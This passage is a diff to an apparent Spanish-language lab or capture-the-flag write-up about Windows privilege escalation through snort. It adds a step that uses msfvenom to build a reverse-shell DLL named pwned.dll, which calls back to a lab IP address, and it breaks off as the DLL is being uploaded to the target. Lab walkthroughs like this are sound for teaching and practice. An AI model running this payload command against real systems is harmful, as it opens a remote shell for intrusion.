@@ -368,4 +368,13 @@ haciendo uso de la herramienta `snort` podemos realizar una explotación de priv
 ![[Pasted image 20240724181036.png]]
 
 ### dll
-vamos a crear un una nueva dll en este caso llamada `pwned.dll` utili
+vamos a crear un una nueva dll en este caso llamada `pwned.dll` utilizando `msfvenom`
+
+```python
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.73 LPORT=9001 -f dll -o pwned.dll
+```
+
+![[Pasted image 20240724182545.png]]
+
+`upload`
+la subimos a la maquina vi
